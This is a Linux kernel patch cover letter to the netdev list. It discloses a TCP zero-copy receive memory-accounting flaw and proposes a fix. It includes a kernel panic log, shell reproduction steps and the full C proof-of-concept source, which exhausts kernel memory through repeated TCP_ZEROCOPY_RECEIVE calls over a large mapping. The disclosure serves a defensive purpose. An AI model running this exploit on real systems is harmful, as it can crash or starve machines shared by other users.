Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6D4A03DD866
	for <netdev@vger.kernel.org>; Tue, 15 Sep 2026 02:46:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789440384; cv=none; b=SeErAu1jaz8POry0LPkBHICMi9/PJL8jeOjikdmlAikeBv8zidbhUO/3oejMbN+PXPEIZmPfGS3wgbNbAsEcb9JMAOXWZGdjMYUj/CUhRN7oJ1zooN8dibaRBrb/971pkBTtLXHqcZvWJ7xCKCsGiVl801vARFiisKuEgHziSL8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789440384; c=relaxed/simple;
	bh=mnhtsO5z0gg0656sz1aDN4dGmqBP57i3WdaLq8aCv2U=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=gPWc7U29yhJGEMUthtGzpZWhf5b/F4W3hose307RxxQjQOJF8RSrtHugkIjhPskK/DMPAcV+H+PJSTyyyoMyzDtVD7p2hZki/MsZWk4k2t6ulKn9h33i6uY8puDf5ZFwgQb+XTq5Jt6b3Vkb9Zp7Tu/dHwepU1zCWqU7GA+6Fh8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=XBjLhqsw; arc=none smtp.client-ip=74.125.227.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="XBjLhqsw"
Received: by mail-pj2-f12.google.com with SMTP id 98e67ed59e1d1-396ccafb751so2760970a91.2
        for <netdev@vger.kernel.org>; Mon, 14 Sep 2026 19:46:22 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789440382; x=1790045182; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=+QHNFTDUzY1+pwZLys6aG+K/mK7eAEukaMOejHA3GyE=;
        b=XBjLhqswqmVP1ul+yFuS0nU1U1oDMGZvNdFZaPW9vhmpPNY7RcpCDMKabj7aOPPWyy
         Lf2/fHHgQv/mHCzvNSLY/O/uSBFGzkKU2d7Rku4q2fpj9517ukG81649kheFfWYmZSbu
         c0l7OLF3Jk9pQxRssZZnScViP/orNMmDRYVqeSvAw32SevFMk6dehcyBZ0ZNT0xVJevK
         yv8WuvoRlFTDVH3maGGIxAxSxQUU5mVigjgO4BfW6cqh1KqkClkH+MzdmiwTm43Nx63x
         DmvVYpnqN5Ei/eVAwx/bnflGW6zXtUdm/b/El8oYlP4zPxCWspjjggiUTnHac3sYkWr8
         wRkQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789440382; x=1790045182;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=+QHNFTDUzY1+pwZLys6aG+K/mK7eAEukaMOejHA3GyE=;
        b=dx+p/gHu1GXsOXMyfQbZeUoMMCkzlzI294VKj59fK0rYOttuO0xmuWRtfsiDIOyEl6
         9z/tKXIrrysnYWc81ASeNEG2jU4htCw4Xvam/Km4BI+zAd22WRhJnzg6QA5WgZMVCti5
         24fIHOYIX/v6evpr3ODCnpmaH+OOrwtaIXT++VHtzgH3SQiINGBJSe8Ljs0pGCXujkcq
         T8764wugDNKms+BBymxSafScT2cd7dEgi41KnVBr80IEaHv1g4rtQb6VDs23WXIv4zKZ
         6oeJ3qDn4T4M/zkHSffyTV2XATov/OuKagwLcBzFoKWEPMcdPzxrjKqjkvtxQPFnMLgM
         BGQg==
X-Gm-Message-State: AFuF++lbO/dyA4nvaW7i43f/MQ+mlY9CL4X6QjQnvvxNsiu8ixzInEf4
	DfAOIdomJRCX5V8FQ/beqBRWxlSCsy/UeDsb5e+qxfSe8wRxCo5Ci/Q9wr3otHyJi1PlZaScdfv
	QCQgDfiE/
X-Gm-Gg: AYBFou3of7lT5HuzEZyMaphLrdNQ79yaOWFYNKHz9ua+VEI1wLrhaQOrPz3b3JkimOr
	gTTE+b3UEDHpkQX2og1J+eYDG1KQhcK0ZiZV+Sw+ZFvg7HvRiO9NsmaZZ6hhvgwqkANzjxZFeBH
	5pWzoK0PzNxW7srJgHrpf+UgqDzgtOw55uIjnGcE7TtZQX7ezOD+niqRpitvyyYQR7/fXS4/QAT
	4aZoxWgtF0KJjnxLU25sRWZ9gJQHpQLc1pTmlveEj7LhS72z6PxClG79uyvzZcjbpio2Seqyz56
	yyoZJ58ImmhmKhda5XtwTOvWMehfKjNG4ngLMqysb0jB1H9Qp8O0BKPw847ZbaPxZ8/a6moRz+H
	5sVD8BZ2pqfrRZzTW9T6pH9mTR/8Y8k5XgnjtNS2laMNAhaHPByakf5ccxmMB+NM2Sp62HZVIDM
	pyxmcZCgCi0v+tJaFOfC2k1NQvkMnNHwfv/jU0yf2ewT8/5ocDWzObozEZLcGxRCYCWSg6VBWe5
	oUfY/9NtA==
X-Received: by 2002:a17:90b:4b81:b0:39d:f95d:bd08 with SMTP id 98e67ed59e1d1-39df95dc372mr5764070a91.14.1789440381678;
        Mon, 14 Sep 2026 19:46:21 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39dfbad50acsm1018250a91.4.2026.09.14.19.46.12
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 14 Sep 2026 19:46:21 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	linux-trace-kernel@vger.kernel.org
Cc: edumazet@google.com,
	kuniyu@google.com,
	pabeni@redhat.com,
	willemb@google.com,
	davem@davemloft.net,
	kuba@kernel.org,
	horms@kernel.org,
	rostedt@goodmis.org,
	mhiramat@kernel.org,
	mathieu.desnoyers@efficios.com,
	ncardwell@google.com,
	vega@nebusec.ai,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] net: tcp: account zero-copy receive VMA memory
Date: Tue, 15 Sep 2026 10:45:39 +0800
Message-ID: <cover.1789284524.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

This series fixes a vulnerability in net/ipv4/tcp.c.

[Vulnerability Details]
TCP_ZEROCOPY_RECEIVE installs page references in a user VMA and consumes
the corresponding skb. The socket charge is released when the skb is
consumed, even though the VMA can retain the receive pages. A process can
therefore retain an unbounded number of receive pages and page-table
memory by advancing through a large VMA. This is a resource-exhaustion
DoS, not a use-after-free or double-free.

Reserve the VMA size in TCP socket memory accounting while the mapping is
alive. Keep the reservation across same-mm VMA splits and moves, release
it when the last VMA fragment is unmapped, and reject VMA expansion and
fork inheritance. Use a separate receive zero-copy accounting kind so
receive-buffer minimum allowances cannot bypass the reservation limit.

[Crash Log]
The clean kernel was booted in QEMU with 2 GiB RAM, 2 vCPUs and TCG. The
reproduction set vm.panic_on_oom=2 so the resource exhaustion produced a
deterministic dmesg panic. 

The resulting clean-kernel log was:

[  701.147561][ T5539] poc invoked oom-killer: gfp_mask=0x440dc0
[  701.148103][ T5539] CPU: 0 UID: 0 PID: 5539 Comm: poc Not tainted
[  701.828535][ T5539] Kernel panic - not syncing: Out of memory:
[  701.830897][ T5539] CPU: 1 UID: 0 PID: 5539 Comm: poc Not tainted
[  701.833017][ T5539] Call Trace:
[  701.840157][ T5539]  out_of_memory+0xc20/0x1680
[  701.841825][ T5539]  __alloc_frozen_pages_noprof+0x2723/0x2e10
[  701.849506][ T5539]  pte_alloc_one+0x1e/0x390
[  701.850240][ T5539]  __pte_alloc+0x6c/0x390
[  701.853267][ T5539]  insert_pages+0x514/0x590
[  701.854826][ T5539]  vm_insert_pages+0x138/0x460
[  701.855568][ T5539]  tcp_zerocopy_vm_insert_batch+0xbf/0x440
[  701.859088][ T5539]  tcp_zerocopy_receive+0x141d/0x29a0
[  701.867523][ T5539]  do_tcp_getsockopt+0x1f4b/0x30d0
[  701.877177][ T5539]  tcp_getsockopt+0xe2/0x110
[  701.883190][ T5539]  __sys_getsockopt+0x131/0x270
[  701.889601][ T5539]  do_syscall_64+0x128/0x7b0
[  701.899898][ T5539] Rebooting in 86400 seconds..

[PoC / Reproduction]
The PoC uses IPv6 loopback and ordinary user-space networking APIs. It
sets SO_ZEROCOPY and a page-aligned TCP_MAXSEG on both endpoints, maps a
large read-only TCP VMA, and repeatedly calls
getsockopt(TCP_ZEROCOPY_RECEIVE) while the sender keeps producing data.
The deterministic OOM run was prepared in the guest as follows:

    make
    sysctl -w vm.panic_on_oom=2
    ./poc 4096

  The mapping and receive path were also validated as test_user without
  additional capabilities or a network namespace. The panic_on_oom setup
  above requires root only to make the OOM result deterministic.

The following is the core of poc.c used for the reproduction.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/tcp.h>
#include <netinet/in.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define LISTEN_PORT 31337
#define PAGE_BYTES 4096U
#define PAGE_ALIGNED_MSS (PAGE_BYTES + 12U)
#define SEND_CHUNK (1U << 20)
#define DEFAULT_MAP_MB 8192ULL
#define HUGE_ALIGN (2UL << 20)

static void die(const char *what)
{
  perror(what);
  exit(EXIT_FAILURE);
}

static unsigned long long parse_mb_arg(const char *arg)
{
  char *end = NULL;
  unsigned long long val;

  errno = 0;
  val = strtoull(arg, &end, 0);
  if (errno || !end || *end)
    die("strtoull");
  return val;
}

static void set_int_sockopt(int fd, int level, int optname, int val,
          const char *name)
{
  if (setsockopt(fd, level, optname, &val, sizeof(val)) < 0)
    die(name);
}

static void connect_loopback(int fd)
{
  struct sockaddr_in6 addr = {
    .sin6_family = AF_INET6,
    .sin6_port = htons(LISTEN_PORT),
  };

  if (inet_pton(AF_INET6, "::1", &addr.sin6_addr) != 1)
    die("inet_pton");

  for (;;) {
    if (!connect(fd, (struct sockaddr *)&addr, sizeof(addr)))
      return;
    if (errno == EINTR)
      continue;
    if (errno == ECONNREFUSED) {
      usleep(100000);
      continue;
    }
    die("connect");
  }
}

static void sender_process(void)
{
  char *buf = malloc(SEND_CHUNK);
  int fd;
  int one = 1;

  if (!buf)
    die("malloc");
  memset(buf, 0x41, SEND_CHUNK);

  fd = socket(AF_INET6, SOCK_STREAM, 0);
  if (fd < 0)
    die("socket(sender)");
  set_int_sockopt(fd, SOL_SOCKET, SO_ZEROCOPY, one, "SO_ZEROCOPY");
  set_int_sockopt(fd, IPPROTO_TCP, TCP_MAXSEG, PAGE_ALIGNED_MSS,
      "TCP_MAXSEG(sender)");
  connect_loopback(fd);

  for (;;) {
    ssize_t ret = send(fd, buf, SEND_CHUNK, MSG_ZEROCOPY);

    if (ret > 0)
      continue;
    if (errno == EINTR)
      continue;
    if (errno == EAGAIN || errno == ENOBUFS) {
      usleep(1000);
      continue;
    }
    die("send(MSG_ZEROCOPY)");
  }
}

static int create_listener(void)
{
  struct sockaddr_in6 addr = {
    .sin6_family = AF_INET6,
    .sin6_port = htons(LISTEN_PORT),
    .sin6_addr = IN6ADDR_LOOPBACK_INIT,
  };
  int fd;
  int one = 1;
  int lowat = SEND_CHUNK;

  fd = socket(AF_INET6, SOCK_STREAM, 0);
  if (fd < 0)
    die("socket(listener)");
  set_int_sockopt(fd, SOL_SOCKET, SO_REUSEADDR, one, "SO_REUSEADDR");
  set_int_sockopt(fd, SOL_SOCKET, SO_RCVLOWAT, lowat, "SO_RCVLOWAT");
  set_int_sockopt(fd, IPPROTO_TCP, TCP_MAXSEG, PAGE_ALIGNED_MSS,
      "TCP_MAXSEG(listener)");
  if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    die("bind");
  if (listen(fd, 1) < 0)
    die("listen");
  return fd;
}

static void *align_ptr(void *ptr)
{
  uintptr_t val = (uintptr_t)ptr;

  val = (val + HUGE_ALIGN - 1) & ~(uintptr_t)(HUGE_ALIGN - 1);
  return (void *)val;
}

static void wait_for_pollin(int fd)
{
  struct pollfd pfd = {
    .fd = fd,
    .events = POLLIN,
  };

  for (;;) {
    int ret = poll(&pfd, 1, 1000);

    if (ret > 0)
      return;
    if (ret == 0)
      continue;
    if (errno == EINTR)
      continue;
    die("poll");
  }
}

static void drain_stream(int fd, uint32_t bytes)
{
  char buf[1 << 15];

  while (bytes) {
    size_t want = bytes < sizeof(buf) ? bytes : sizeof(buf);
    ssize_t ret = read(fd, buf, want);

    if (ret > 0) {
      bytes -= (uint32_t)ret;
      continue;
    }
    if (ret == 0)
      exit(EXIT_FAILURE);
    if (errno == EAGAIN || errno == EWOULDBLOCK) {
      wait_for_pollin(fd);
      continue;
    }
    if (errno == EINTR)
      continue;
    die("read");
  }
}

static void set_nonblock(int fd)
{
  int flags = fcntl(fd, F_GETFL, 0);

  if (flags < 0)
    die("fcntl(F_GETFL)");
  if (fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0)
    die("fcntl(F_SETFL)");
}

static void receiver_process(int fd, unsigned long long map_mb)
{
  struct tcp_zerocopy_receive zc;
  void *mapping_raw;
  void *mapping;
  uint64_t map_len = map_mb << 20;
  uint64_t mapped = 0;
  socklen_t optlen;

  mapping_raw = mmap(NULL, map_len + HUGE_ALIGN, PROT_READ, MAP_SHARED,
         fd, 0);
  if (mapping_raw == MAP_FAILED)
    die("mmap(socket)");
  mapping = align_ptr(mapping_raw);

  set_nonblock(fd);
  for (;;) {
    memset(&zc, 0, sizeof(zc));
    zc.address = (uintptr_t)mapping + mapped;
    zc.length = (map_len - mapped) > SEND_CHUNK ?
          SEND_CHUNK : (uint32_t)(map_len - mapped);
    optlen = sizeof(zc);

    if (!zc.length)
      exit(EXIT_FAILURE);
    if (getsockopt(fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE,
             &zc, &optlen) < 0) {
      if (errno == EINTR)
        continue;
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        wait_for_pollin(fd);
        continue;
      }
      if (errno == EIO)
        exit(EXIT_SUCCESS);
      die("getsockopt(TCP_ZEROCOPY_RECEIVE)");
    }

    mapped += zc.length;
    if (zc.recv_skip_hint)
      drain_stream(fd, zc.recv_skip_hint);
    if (!zc.length && !zc.recv_skip_hint)
      wait_for_pollin(fd);
  }
}

int main(int argc, char **argv)
{
  struct sockaddr_in6 peer;
  socklen_t peer_len = sizeof(peer);
  unsigned long long map_mb = DEFAULT_MAP_MB;
  pid_t child;
  int listen_fd;
  int conn_fd;

  if (argc > 1)
    map_mb = parse_mb_arg(argv[1]);
  listen_fd = create_listener();
  child = fork();
  if (child < 0)
    die("fork");
  if (!child)
    sender_process();

  conn_fd = accept(listen_fd, (struct sockaddr *)&peer, &peer_len);
  if (conn_fd < 0)
    die("accept");
  set_int_sockopt(conn_fd, SOL_SOCKET, SO_RCVLOWAT, SEND_CHUNK,
      "SO_RCVLOWAT(accepted)");
  set_int_sockopt(conn_fd, IPPROTO_TCP, TCP_MAXSEG, PAGE_ALIGNED_MSS,
      "TCP_MAXSEG(accepted)");
  receiver_process(conn_fd, map_mb);
  kill(child, SIGKILL);
  waitpid(child, NULL, 0);
  return 0;
}
------END poc.c------

[Validation]
The clean-kernel run reached the panic shown above. The patched kernel
rejected the oversized VMA reservation with -ENOMEM instead of allowing
the mapping to consume unaccounted memory. The patched kernel was also
tested with ordinary TCP traffic, IPv4 and IPv6 receive zero-copy, failed
multi-chunk charges, VMA split and move paths, fork, partial unmap, file
descriptor close, process exit, signals, shutdown, EOF, multiple
mappings, and repeated teardown. Accounting returned to zero after
teardown, and no new KASAN, BUG, Oops, panic, UAF, out-of-bounds, soft
lockup, or hung task was observed.

---

Zixuan Chai (1):
  net: tcp: account zero-copy receive VMA memory

 include/net/sock.h          |   1 +
 include/trace/events/sock.h |   3 +-
 net/core/sock.c             |   2 +-
 net/ipv4/tcp.c              | 102 ++++++++++++++++++++++++++++++++++--
 4 files changed, 103 insertions(+), 5 deletions(-)

